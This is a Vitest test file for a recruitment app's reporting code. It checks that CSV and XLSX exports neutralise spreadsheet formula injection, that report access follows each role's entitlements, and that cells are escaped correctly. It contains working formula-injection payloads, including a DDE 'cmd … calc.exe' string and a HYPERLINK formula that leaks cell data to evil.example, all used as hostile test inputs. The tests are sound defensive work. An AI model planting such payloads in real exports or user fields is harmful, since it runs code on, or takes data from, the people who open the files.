import { beforeEach, describe, expect, it } from 'vitest';
import { csvSafeCell, generateReport, reportsFor, reportToCsv, REPORTS } from '@/lib/reports';
import { reportToXlsx } from '@/lib/report-excel';
import { processIncomingEmail } from '@/lib/agents/intake';
import { db, resetStore } from '@/lib/store';
import type { Role } from '@/lib/types';

beforeEach(() => resetStore());

/* ==================================================================== */
/* Spreadsheet formula injection                                        */
/* ==================================================================== */

/**
 * Candidate names, employers and subject lines enter this system from inbound
 * application email, so an applicant controls them. Excel and Google Sheets
 * evaluate any cell starting with = + - @ or a control character as a formula.
 * Without neutralisation, an applicant can execute code on a recruiter's
 * machine the moment they open an export.
 */
const PAYLOADS = [
  "=cmd|'/c calc.exe'!A0",
  '+1+1',
  '-2-3',
  '@SUM(1+1)*cmd|\' /C calc\'!A0',
  '=HYPERLINK("http://evil.example?leak="&A1,"Click")',
  '\tinnocent looking',
];

describe('csvSafeCell', () => {
  it('neutralises every formula-trigger prefix', () => {
    PAYLOADS.forEach((p) => {
      const safe = csvSafeCell(p);
      expect(safe.startsWith("'"), `"${p.slice(0, 20)}" was not neutralised`).toBe(true);
      expect(safe.slice(1)).toBe(p); // content preserved, only prefixed
    });
  });

  it('leaves ordinary values untouched', () => {
    ['John Doe', 'Senior DevOps Engineer', '92%', 'AED 31,000', '', 'a=b'].forEach((v) =>
      expect(csvSafeCell(v)).toBe(v),
    );
    expect(csvSafeCell(42)).toBe('42');
  });
});

describe('CSV export cannot carry an executable payload', () => {
  it('neutralises a hostile candidate name that arrived by email', async () => {
    const PAYLOAD = "=cmd|'/c calc.exe'!A0";

    await processIncomingEmail(
      {
        messageId: 'attack-1',
        fromName: PAYLOAD,
        fromEmail: 'attacker@evil.example',
        subject: 'Application – DEVOPS-2026-004',
        body: 'CV attached.',
        receivedAt: new Date().toISOString(),
        attachments: [{ filename: 'cv.pdf', mimeType: 'application/pdf', sizeBytes: 100_000 }],
      },
      {
        mailboxId: db.mailboxes[0].id,
        mailboxAddress: db.mailboxes[0].address,
        provider: 'demo',
        resumeText: 'experience skills education\nunstructured body with no parseable name',
        simulated: true,
        actor: 'Test',
      },
    );

    // the hostile string is stored (we do not silently mangle candidate data)…
    expect(db.candidates[0].name.toLowerCase()).toContain('cmd|');

    // …but no CSV cell may begin with a formula trigger
    REPORTS.forEach((meta) => {
      const report = generateReport(meta.id, 'HR_ADMIN');
      if (!report) return;
      reportToCsv(report)
        .split('\n')
        .forEach((line) => {
          // split on commas outside quotes is approximated by checking raw cells
          line.split(',').forEach((cell) => {
            const unquoted = cell.replace(/^"|"$/g, '');
            expect(
              /^[=+\-@\t\r]/.test(unquoted),
              `formula-triggering cell in report "${meta.id}": ${unquoted.slice(0, 60)}`,
            ).toBe(false);
          });
        });
    });
  });

  it('writes the payload to xlsx as text, never as a formula', async () => {
    const PAYLOAD = "=cmd|'/c calc.exe'!A0";
    await processIncomingEmail(
      {
        messageId: 'attack-2',
        fromName: PAYLOAD,
        fromEmail: 'attacker@evil.example',
        subject: 'Application – DEVOPS-2026-004',
        body: 'CV attached.',
        receivedAt: new Date().toISOString(),
        attachments: [{ filename: 'cv.pdf', mimeType: 'application/pdf', sizeBytes: 100_000 }],
      },
      {
        mailboxId: db.mailboxes[0].id,
        mailboxAddress: db.mailboxes[0].address,
        provider: 'demo',
        resumeText: 'experience skills education\nunstructured',
        simulated: true,
        actor: 'Test',
      },
    );

    const report = generateReport('intake-automation', 'HR_ADMIN');
    if (!report) return;
    const buffer = await reportToXlsx(report, 'Test User');
    const xml = buffer.toString('latin1');

    // ExcelJS stores plain strings as text; assert no formula element carries it
    const formulaWithPayload = /<f[ >][^<]*cmd\|/i.test(xml);
    expect(formulaWithPayload, 'payload was written into a formula element').toBe(false);
    expect(buffer.length).toBeGreaterThan(1000);
  });
});

/* ==================================================================== */
/* Report authorisation                                                 */
/* ==================================================================== */

const ROLES: Role[] = ['HR_ADMIN', 'RECRUITER', 'HIRING_MANAGER', 'EMPLOYEE'];

describe('report entitlement', () => {
  it('only ever lists reports the role may actually generate', () => {
    ROLES.forEach((role) =>
      reportsFor(role).forEach((meta) =>
        expect(generateReport(meta.id, role), `${role} listed but cannot generate ${meta.id}`).toBeTruthy(),
      ),
    );
  });

  it('refuses to generate a report the role is not entitled to', () => {
    ROLES.forEach((role) => {
      const entitled = new Set(reportsFor(role).map((r) => r.id));
      REPORTS.filter((r) => !entitled.has(r.id)).forEach((meta) =>
        expect(generateReport(meta.id, role), `${role} generated forbidden report ${meta.id}`).toBeNull(),
      );
    });
  });

  it('returns null for an unknown report id', () => {
    expect(generateReport('no-such-report', 'HR_ADMIN')).toBeNull();
  });

  it('gives HR administrators the widest entitlement', () => {
    const admin = reportsFor('HR_ADMIN').length;
    ROLES.filter((r) => r !== 'HR_ADMIN').forEach((role) =>
      expect(reportsFor(role).length).toBeLessThanOrEqual(admin),
    );
  });
});

/* ==================================================================== */
/* Report content                                                       */
/* ==================================================================== */

describe('report content', () => {
  it('ships methodology and caveats with every report', () => {
    reportsFor('HR_ADMIN').forEach((meta) => {
      const r = generateReport(meta.id, 'HR_ADMIN')!;
      expect(r.methodology.length, `${meta.id} has no methodology`).toBeGreaterThan(0);
      expect(r.caveats.length, `${meta.id} has no caveats`).toBeGreaterThan(0);
      expect(r.generatedAt).toMatch(/^\d{4}-\d{2}-\d{2}/);
    });
  });

  it('produces a non-empty CSV for every entitled report', () => {
    reportsFor('HR_ADMIN').forEach((meta) => {
      const csv = reportToCsv(generateReport(meta.id, 'HR_ADMIN')!);
      expect(csv.length, `${meta.id} produced an empty CSV`).toBeGreaterThan(50);
      expect(csv).toContain(meta.name);
    });
  });

  it('escapes commas and quotes so columns cannot be shifted', () => {
    const r = generateReport(reportsFor('HR_ADMIN')[0].id, 'HR_ADMIN')!;
    r.kpis.push({ label: 'Tricky, label', value: 'has "quotes"', hint: 'and, commas' });
    const line = reportToCsv(r).split('\n').find((l) => l.includes('Tricky'))!;
    expect(line).toContain('"Tricky, label"');
    expect(line).toContain('""quotes""');
  });
});
